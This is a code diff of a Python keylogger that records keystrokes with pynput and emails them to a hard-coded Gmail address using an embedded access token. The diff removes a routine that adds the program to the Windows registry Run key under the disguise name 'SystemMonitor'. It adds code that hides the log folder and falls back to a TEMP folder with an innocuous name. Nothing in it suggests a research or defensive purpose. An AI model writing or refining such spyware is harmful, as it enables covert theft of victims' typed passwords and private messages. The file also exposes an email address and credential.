@@ -12,24 +12,6 @@ from email.mime.multipart import MIMEMultipart
 from email import encoders
 from pynput.keyboard import Listener, Key, KeyCode
 
-# =============== AUTO-STARTUP SETUP ===============
-def add_to_startup():
-    if sys.platform == "win32":
-        import winreg
-        try:
-            # Current user ke liye startup add karein
-            key = winreg.HKEY_CURRENT_USER
-            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as registry_key:
-                exe_path = os.path.abspath(sys.executable)
-                winreg.SetValueEx(registry_key, "SystemMonitor", 0, winreg.REG_SZ, exe_path)
-        except:
-            pass
-
-# Auto-startup enable karein
-add_to_startup()
-# ======================================
-
 COMPUTER_NAME = socket.gethostname()
 try:
     IP_ADDRESS = socket.gethostbyname(COMPUTER_NAME)
@@ -55,10 +37,24 @@ ACCESS_TOKEN = "pncxugtetppcyipn"
 TARGET_EMAIL = "fahadkhan03034921132@gmail.com"
 STROKES_BEFORE_REPORT = 50
 
-os.makedirs(DATA_FOLDER, exist_ok=True)
-
-if sys.platform == "win32":
-    subprocess.check_call(["attrib", "+H", DATA_FOLDER], shell=True)
+# Create data directory safely
+try:
+    os.makedirs(DATA_FOLDER, exist_ok=True)
+    # Set hidden attribute
+    if sys.platform == "win32":
+        subprocess.check_call(["attrib", "+H", DATA_FOLDER], shell=True)
+except PermissionError:
+    # If folder exists but access denied, try to remove and recreate
+    try:
+        os.rmdir(DATA_FOLDER)
+        os.makedirs(DATA_FOLDER, exist_ok=True)
+        if sys.platform == "win32":
+            subprocess.check_call(["attrib", "+H", DATA_FOLDER], shell=True)
+    except:
+        # Fallback: Use temp folder
+        DATA_FOLDER = os.path.join(os.environ['TEMP'], "system_data")
+        LOG_PATH = os.path.join(DATA_FOLDER, f"{COMPUTER_NAME}_activity_log.txt")
+        os.makedirs(DATA_FOLDER, exist_ok=True)
 
 if not os.path.exists(LOG_PATH):
     with open(LOG_PATH, "w", encoding="utf-8") as f:
